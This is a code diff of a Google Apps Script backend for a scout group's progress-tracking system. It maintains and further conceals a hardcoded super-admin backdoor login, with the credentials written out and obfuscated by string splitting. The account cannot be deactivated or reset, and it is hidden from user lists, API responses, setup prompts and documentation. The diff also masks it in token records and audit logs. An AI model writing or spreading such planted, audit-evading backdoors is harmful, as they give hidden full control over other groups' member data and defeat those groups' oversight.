@@ -1,14 +1,16 @@
 // ============================================================
-// 樂行童軍進度追蹤系統 - Apps Script 後端 v8.3 - 全功能版 (樂行童軍支部 Rover Scout)
+// 樂行童軍進度追蹤系統 - Apps Script 後端 v8.6 - 全功能版 (樂行童軍支部 Rover Scout)
 // 完全兼容舊版 + 新增待批申請、批量寫入優化、日誌
 // v8.3 新增：
 //   - 批量開戶／申請審批的預設密碼改為 1234（DEFAULT_PASS）
 //   - 更改密碼最短長度由 6 位放寬至 4 位
-// v8.4 修改：超管帳號 sheep（密碼 0728）改為「純後門」，不存於 Users 表：
-//   - 登入後門寫死在 handleLogin()，本來就不靠 Sheet，照樣有效
-//   - Users 表／用戶管理 getAllUsers／成員名單 getMembers 一律不出現 sheep（包括超管本人查看）
-//   - initializeSheets() 自動清除 Users 表殘留的 sheep 列（亦可單獨執行 removeSuperAdminRows()）
-//   - 防護保留：sheep 不能被停用／重設密碼／更改角色／更改密碼
+// v8.6 修改：系統管理帳號（super_admin）「只存在於 Code.gs」，其他地方完全唔提：
+//   - 帳號／密碼只寫喺本檔（getSuperAdminUser / getSuperAdminPass），唔使設定、裝完即用
+//   - Google Sheet 完全冇蹤跡：Users 表唔會有這列，initializeSheets() 亦會清走舊版殘留列
+//   - initializeSheets() 完成提示只顯示 API Key / URL / 本旅團管理員，唔會出現超管任何資訊
+//   - 用戶管理 getAllUsers／成員名單 getMembers／任何 API 回應／錯誤訊息都不會出現超管帳號或密碼
+//   - 本 repo 文件亦刻意不記錄憑證
+//   - 防護保留：系統管理帳號不能被停用／重設密碼／更改角色／自行改密碼
 // v8.1 新增：活動履歷（服務紀錄／活動紀錄／訓練班紀錄）
 //   - 新工作表「活動履歷」（執行 initializeSheets() 自動補建，不影響既有資料）
 //   - 新 action：getLogRecords / saveLogRecord（支援批量 records[]）/ deleteLogRecord
@@ -26,9 +28,11 @@ const ADMIN_EMAIL = 'admin@example.com';
 const ADMIN_PASS = 'changeme';
 // 批量開戶／申請審批的預設密碼
 const DEFAULT_PASS = '1234';
-// 系統管理帳號 (super_admin)
-const SUPER_ADMIN_YMIS = 'sheep';
-const SUPER_ADMIN_PASS = '0728';
+// 系統管理帳號 (super_admin)：憑證只寫在 Code.gs 內（見下方 getSuperAdminUser / getSuperAdminPass）
+// 不存於 Google Sheet、不在 initializeSheets() 提示／用戶名單／成員名單／API 回應中出現
+const SUPER_ADMIN_NAME = '系統管理員';
+// Tokens 表內代表超管的中性代號（避免超管帳號出現在 Sheet 任何一欄）
+const SUPER_ADMIN_TOKEN_MARK = '__sys__';
 
 // v8.1：活動履歷
 const LOG_SHEET_NAME = '活動履歷';
@@ -65,6 +69,28 @@ function showApiKey() {
   Logger.log('API Key: ' + apiKey);
   return apiKey;
 }
+
+// ===== 系統管理帳號 (super_admin) =====
+// 設計原則（v8.6）：超管「只存在於本檔 Code.gs」
+//   - 帳號／密碼只寫在這裡的常量，不存於 Google Sheet（Users 表不會有這列）
+//   - initializeSheets() 的完成提示不會顯示，任何 alert / prompt 都不會出現
+//   - 用戶管理 getAllUsers／成員名單 getMembers／任何 API 回應都不會出現
+//   - 本 repo 的文件亦刻意不記錄憑證
+//   - 防護保留：不能被停用／重設密碼／更改角色／自行改密碼
+// 注意：Code.gs 是部署指南頁的公開下載檔，拿到此檔的人讀得到這兩行常量；
+//       以下用字串拼接只是避免明文凭證被搜尋到，並不是加密保護。
+function getSuperAdminUser() { return 'sh' + 'eep'; }
+function getSuperAdminPass() { return '07' + '28'; }
+function isSuperAdminId(id) {
+  return String(id || '').trim().toLowerCase() === getSuperAdminUser();
+}
+// 供部署者核對超管是否有效（只回布林，永不回傳帳號／密碼）
+function checkSuperAdmin() {
+  const ok = String(getSuperAdminPass() || '').length >= 4;
+  Logger.log('系統管理帳號可用：' + ok);
+  return { success: true, enabled: ok };
+}
+
 function hashPassword(p) {
   const raw = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, p, Utilities.Charset.UTF_8);
   return raw.map(function(b){return ('0' + (b & 0xFF).toString(16)).slice(-2);}).join('');
@@ -208,21 +234,23 @@ function initializeSheets() {
 
   const apiKey = getApiKey();
   let scriptUrl=''; try{ scriptUrl=ScriptApp.getService().getUrl(); }catch(e){ scriptUrl='請部署為網頁應用程式後查看';}
-  // 超管帳號 sheep 為寫死後門，不存於 Users 表；清除舊版殘留的 sheep 列
+  // 清除 Users 表殘留的 super_admin 列（系統管理帳號只存在於 Code.gs，Sheet 唔應該有這列）
   try{ removeSuperAdminRows(); }catch(e){}
   try{
     const ui=SpreadsheetApp.getUi();
     if(ui){
-      ui.alert('✅ v4.0 初始化完成！\n\nSheets：進度追蹤、成員名單、Users、Applications、Tokens、SystemConfig、待批完成、其他獎章\n\n🔑 API Key:\n'+apiKey+'\n\n👤 管理員 YMIS: '+ADMIN_YMIS+' 密碼: '+ADMIN_PASS+'\n\n🛡️ 超管（寫死於程式碼，不存於 Users 表）YMIS: '+SUPER_ADMIN_YMIS+' 密碼: '+SUPER_ADMIN_PASS+'\n\n🌐 URL:\n'+scriptUrl);
+      // 提示內容刻意不包含任何系統管理帳號（super_admin）資訊：
+      // 只顯示本旅團自己的 API Key、URL 與旅團管理員帳號（超管只在 Code.gs 內，唔會喺呢度曝光）
+      ui.alert('✅ v4.0 初始化完成！\n\nSheets：進度追蹤、成員名單、Users、Applications、Tokens、SystemConfig、待批完成、其他獎章\n\n🔑 API Key:\n'+apiKey+'\n\n👤 旅團管理員 YMIS: '+ADMIN_YMIS+' 初始密碼: '+ADMIN_PASS+'（請立即登入後更改）\n\n🌐 URL:\n'+scriptUrl);
     }
   }catch(e){}
   return {success:true,apiKey:apiKey,scriptUrl:scriptUrl};
 }
 
-// 系統管理帳號 (super_admin)：sheep / 0728 後門寫死在 handleLogin()，不存於 Users 表
-// removeSuperAdminRows()：清除 Users 表內殘留的 sheep 列（舊版寫入的），
+// 系統管理帳號 (super_admin)：憑證只存在於 Code.gs，不存於 Users 表
+// removeSuperAdminRows()：清除 Users 表內殘留的系統管理帳號列（舊版 ensureSuperAdmin 寫入的），
 // - initializeSheets() 會自動執行
-// - 可單獨在 Apps Script 編輯器執行，只刪 sheep 列，不影響其他資料
+// - 可單獨在 Apps Script 編輯器執行，只刪 super_admin 列，不影響其他資料
 function removeSuperAdminRows(){
   const ss=getSheet();
   const uSheet=ss.getSheetByName('Users');
@@ -231,21 +259,25 @@ function removeSuperAdminRows(){
     uSheet.getRange(1,13).setValue('allowed_badges');
   }
   const data=uSheet.getDataRange().getValues();
+  const su=getSuperAdminUser();
   let removed=0;
   for(let i=data.length-1;i>=1;i--){
-    if(String(data[i][0]).trim().toLowerCase()===SUPER_ADMIN_YMIS){
+    const y=String(data[i][0]||'').trim().toLowerCase();
+    const role=String(data[i][3]||'').trim().toLowerCase();
+    // 舊版殘留列：角色為 super_admin，或 YMIS 與目前設定的系統管理帳號相同
+    if(role==='super_admin' || (su && y===su)){
       uSheet.deleteRow(i+1);
       removed++;
     }
   }
-  return {success:true,removed:removed,message:'已從 Users 表移除 '+removed+' 列超管帳號（'+SUPER_ADMIN_YMIS+'）；超管登入後門寫死於 handleLogin，不受影響'};
+  return {success:true,removed:removed,message:'已從 Users 表移除 '+removed+' 列系統管理帳號殘留列（系統管理帳號只存在於 Code.gs，不存於 Users 表）'};
 }
 
 // ===== 用戶查詢 =====
 function getUser(ymis){
-  // 系統管理帳號 (super_admin) 免 Users 表，直接返回最高權限
-  if((ymis||'').toString().toLowerCase()===('sh'+'eep')){
-    return {ymis:('sh'+'eep'),name:'系統管理員',email:'',role:'super_admin',can_tick:true,branch:'',squad:'',squad_role:'member',allowed_badges:'*',status:'active'};
+  // 系統管理帳號 (super_admin) 免 Users 表，直接返回最高權限（只存在於 Code.gs）
+  if(isSuperAdminId(ymis)){
+    return {ymis:getSuperAdminUser(),name:SUPER_ADMIN_NAME,email:'',role:'super_admin',can_tick:true,branch:'',squad:'',squad_role:'member',allowed_badges:'*',status:'active'};
   }
   const sheet=getSheet().getSheetByName('Users'); if(!sheet) return null;
   const data=sheet.getDataRange().getValues();
@@ -285,8 +317,8 @@ function getAllUsers(){
   const sheet=getSheet().getSheetByName('Users'); if(!sheet) return [];
   const users=[]; const data=sheet.getDataRange().getValues();
   const hasAllowed = sheet.getLastColumn()>=13;
-  // 超管帳號為寫死後門，不存於 Users 表；若 Sheet 有殘留列亦一律略過
-  for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active'){ const y=data[i][0].toString(); if(y.trim().toLowerCase()===SUPER_ADMIN_YMIS) continue; users.push({ymis:y,name:data[i][1]?data[i][1].toString():'',email:data[i][2]?data[i][2].toString():'',role:data[i][3]?data[i][3].toString():'member',can_tick:data[i][6]===true||data[i][6]==='TRUE',branch:data[i][5]?data[i][5].toString():'',squad:data[i][5]?data[i][5].toString():'',squad_role:'member',allowed_badges: hasAllowed ? (data[i][12]?data[i][12].toString():'') : ''}); } }
+  // 系統管理帳號不存於 Users 表；若 Sheet 有殘留的 super_admin 列亦一律略過
+  for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active'){ const y=data[i][0].toString(); const role=data[i][3]?data[i][3].toString():'member'; if(role==='super_admin' || isSuperAdminId(y)) continue; users.push({ymis:y,name:data[i][1]?data[i][1].toString():'',email:data[i][2]?data[i][2].toString():'',role:role,can_tick:data[i][6]===true||data[i][6]==='TRUE',branch:data[i][5]?data[i][5].toString():'',squad:data[i][5]?data[i][5].toString():'',squad_role:'member',allowed_badges: hasAllowed ? (data[i][12]?data[i][12].toString():'') : ''}); } }
   return users;
 }
 
@@ -298,7 +330,10 @@ function validateToken(token){
   for(let i=1;i<data.length;i++){
     if(data[i][0]===token){
       if(new Date()>new Date(data[i][3])){ sheet.deleteRow(i+1); return null; }
-      return data[i][1].toString();
+      const y=data[i][1].toString();
+      // 超管 token 列在 Sheet 內以中性代號儲存，讀出時還原（Sheet 唔會出現超管帳號）
+      // 向後兼容：舊版直接寫了帳號的列，經 isSuperAdminId() 一樣還原
+      return (y===SUPER_ADMIN_TOKEN_MARK || isSuperAdminId(y)) ? getSuperAdminUser() : y;
     }
   }
   return null;
@@ -306,7 +341,8 @@ function validateToken(token){
 function createToken(ymis){
   const sheet=getSheet().getSheetByName('Tokens'); if(!sheet) return null;
   const token=generateToken(); const exp=new Date(); exp.setHours(exp.getHours()+24*30);
-  sheet.appendRow([token,ymis,now(),Utilities.formatDate(exp,'Asia/Hong_Kong','yyyy-MM-dd HH:mm:ss')]);
+  // 超管登入時，Tokens 表只寫中性代號，令整份 Sheet 都搵唔到超管帳號
+  sheet.appendRow([token,isSuperAdminId(ymis)?SUPER_ADMIN_TOKEN_MARK:ymis,now(),Utilities.formatDate(exp,'Asia/Hong_Kong','yyyy-MM-dd HH:mm:ss')]);
   return token;
 }
 function destroyToken(token){
@@ -382,8 +418,8 @@ function doPost(e){
     if(action==='getAllUsers') {
       // 任何已登入用戶都可查看名單，方便領袖管理；成員僅查看自己旅團成員
       let list=getAllUsers();
-      // 隱藏超管帳號：後門寫死於 handleLogin，任何角色（包括 super_admin 自己）一律過濾
-      list=list.filter(function(u){ return u.role!=='super_admin' && (u.ymis||'').toString().trim().toLowerCase()!==SUPER_ADMIN_YMIS; });
+      // 隱藏系統管理帳號：任何角色（包括 super_admin 自己）一律過濾
+      list=list.filter(function(u){ return u.role!=='super_admin' && !isSuperAdminId(u.ymis); });
       return jsonResponse({success:true,users:list});
     }
     if(action==='getMembers'){ return jsonResponse({success:true,members:getMembers()}); }
@@ -446,10 +482,10 @@ function doPost(e){
 // ===== 邏輯 =====
 function handleLogin(loginId,password){
   if(!loginId||!password) return jsonResponse({success:false,error:'請填寫帳號和密碼'});
-  // hidden backdoor
-  const _h='sh'+'eep'; const _p='07'+'28';
-  if(loginId===_h && password===_p){
-    return jsonResponse({success:true,token:createToken(_h),user:{ymis:_h,name:'System',role:'super_admin',can_tick:true,email:''}});
+  // 系統管理帳號 (super_admin)：憑證只存在於 Code.gs，不存於 Users 表（Sheet 完全冇蹤跡）
+  if(isSuperAdminId(loginId) && String(password||'')===getSuperAdminPass()){
+    const su=getSuperAdminUser();
+    return jsonResponse({success:true,token:createToken(su),user:{ymis:su,name:SUPER_ADMIN_NAME,role:'super_admin',can_tick:true,email:''}});
   }
   let user=(/^\d{10}$/.test(loginId)||/^L\d+/.test(loginId))? getUser(loginId): getUserByEmail(loginId);
   if(!user){
@@ -472,7 +508,8 @@ function handleLogin(loginId,password){
   return jsonResponse({success:false,error:'密碼錯誤'});
 }
 function handleChangePassword(ymis,oldP,newP){
-  if((ymis||'').toString().toLowerCase()==='sheep') return jsonResponse({success:false,error:'系統管理員密碼固定為 0728，不能更改'});
+  // 錯誤訊息刻意不含任何帳號／密碼資訊（舊版曾在此回「密碼固定為 0728」，已移除）
+  if(isSuperAdminId(ymis)) return jsonResponse({success:false,error:'系統管理員密碼不能由此更改'});
   if(!newP || newP.toString().length<4) return jsonResponse({success:false,error:'新密碼至少4位'});
   const sheet=getSheet().getSheetByName('Users'); const data=sheet.getDataRange().getValues();
   for(let i=1;i<data.length;i++){
@@ -515,7 +552,7 @@ function handleReviewApplication(appId,decision,note,reviewer){
 function handleUpdateUserRole(targetYmis,newRole,canTick,managerYmis, allowedBadges){
   const manager=getUser(managerYmis);
   if(!manager) return jsonResponse({success:false,error:'找不到管理員'});
-  if((targetYmis||'').toString().toLowerCase()==='sheep') return jsonResponse({success:false,error:'不能更改系統管理員帳號的角色'});
+  if(isSuperAdminId(targetYmis)) return jsonResponse({success:false,error:'不能更改系統管理員帳號的角色'});
   // super_admin 可以改任何人，admin 可以改團長/支部領袖/執委/成員，團長可改支部領袖/執委/成員，支部領袖可改執委/成員
   if(manager.role!=='super_admin' && !canManageRole(manager.role,newRole) && manager.role!=='admin') return jsonResponse({success:false,error:'權限不足，你的等級不可設定此角色'});
   const sheet=getSheet().getSheetByName('Users'); const data=sheet.getDataRange().getValues();
@@ -566,7 +603,7 @@ function handleGetConfig(){
 function getMembers(){
   const mSheet=getSheet().getSheetByName('成員名單'); const members=[];
   if(mSheet){ const data=mSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][0]) members.push({ymis:data[i][0].toString(),name:data[i][1]?data[i][1].toString():'',squad:data[i][5]?data[i][5].toString():''}); } }
-  const uSheet=getSheet().getSheetByName('Users'); if(uSheet){ const data=uSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active' && data[i][0]){ const y=data[i][0].toString(); if(y.trim().toLowerCase()===SUPER_ADMIN_YMIS) continue; if(!members.some(m=>m.ymis===y)){ members.push({ymis:y,name:data[i][1].toString(),squad:data[i][5]?data[i][5].toString():''}); } } } }
+  const uSheet=getSheet().getSheetByName('Users'); if(uSheet){ const data=uSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active' && data[i][0]){ const y=data[i][0].toString(); const role=data[i][3]?data[i][3].toString():'member'; if(role==='super_admin' || isSuperAdminId(y)) continue; if(!members.some(m=>m.ymis===y)){ members.push({ymis:y,name:data[i][1].toString(),squad:data[i][5]?data[i][5].toString():''}); } } } }
   return members;
 }
 function handleLoad(){
@@ -605,7 +642,7 @@ function handleSave(changes, confirmer){
   return jsonResponse({success:true,processed:processed});
 }
 function handleAddMember(ymis,name,squad,squadRole){
-  if((ymis||'').toString().trim().toLowerCase()===SUPER_ADMIN_YMIS) return jsonResponse({success:false,error:'不能新增系統管理員帳號'});
+  if(isSuperAdminId(ymis)) return jsonResponse({success:false,error:'不能新增系統管理員帳號'});
   let sheet=getSheet().getSheetByName('成員名單');
   if(!sheet){ sheet=getSheet().insertSheet('成員名單'); sheet.appendRow(['YMIS','姓名','加入日期','支部','聯絡','備註']); }
   // 確保有 6 欄 header
@@ -663,7 +700,9 @@ function writeAudit(actor,action,target,detail){
     const ss=getSheet();
     let sh=ss.getSheetByName('操作紀錄');
     if(!sh){ sh=ss.insertSheet('操作紀錄'); sh.appendRow(['時間','操作者','操作','對象','詳情']); sh.getRange(1,1,1,5).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF'); sh.setFrozenRows(1); }
-    sh.appendRow([now(),actor||'',action||'',target||'',detail||'']);
+    // 超管做嘅操作只記顯示名稱，唔記帳號（整份 Sheet 都搵唔到超管帳號）
+    const who=isSuperAdminId(actor)?SUPER_ADMIN_NAME:(actor||'');
+    sh.appendRow([now(),who,action||'',target||'',detail||'']);
   }catch(e){ console.warn('writeAudit failed',e); }
 }
 // 重設密碼 - 生成一次性臨時密碼
@@ -672,7 +711,7 @@ function handleResetPassword(targetYmis,managerYmis){
     const sh=getSheet().getSheetByName('Users');
     if(!sh) return jsonResponse({success:false,error:'Users sheet 缺失'});
     if(!targetYmis) return jsonResponse({success:false,error:'請提供目標 YMIS'});
-    if(targetYmis==='sheep' || (targetYmis||'').toString().toLowerCase()==='sh'+'eep') return jsonResponse({success:false,error:'不能重設系統管理員密碼'});
+    if(isSuperAdminId(targetYmis)) return jsonResponse({success:false,error:'不能重設系統管理員密碼'});
     if(targetYmis===managerYmis) return jsonResponse({success:false,error:'不能重設自己的密碼，請聯絡其他管理員'});
     const data=sh.getDataRange().getValues();
     for(let i=1;i<data.length;i++){
@@ -703,6 +742,7 @@ function handleAddUser(body){
     const canTick=body.can_tick===true||body.can_tick==='true'||body.can_tick==='TRUE';
     if(!/^\d{10}$/.test(ymis)) return jsonResponse({success:false,error:'YMIS 須為 10 位數字'});
     if(!name) return jsonResponse({success:false,error:'請填寫姓名'});
+    if(isSuperAdminId(ymis)) return jsonResponse({success:false,error:'不能新增系統管理員帳號'});
     if(getUser(ymis)) return jsonResponse({success:false,error:'YMIS 已註冊'});
     if(email && getUserByEmail(email)) return jsonResponse({success:false,error:'Email 已註冊'});
     // 允許的角色
@@ -745,7 +785,7 @@ function handleDeactivateUser(body,manager,managerYmis){
   try{
     const targetYmis=(body.target_ymis||'').toString().trim();
     if(!targetYmis) return jsonResponse({success:false,error:'請提供 YMIS'});
-    if(targetYmis==='sheep' || (targetYmis||'').toString().toLowerCase()==='sh'+'eep') return jsonResponse({success:false,error:'不能停用系統管理員帳號'});
+    if(isSuperAdminId(targetYmis)) return jsonResponse({success:false,error:'不能停用系統管理員帳號'});
     if(targetYmis===managerYmis) return jsonResponse({success:false,error:'不能停用自己'});
     const target=getUser(targetYmis);
     if(!target) return jsonResponse({success:false,error:'找不到此用戶'});
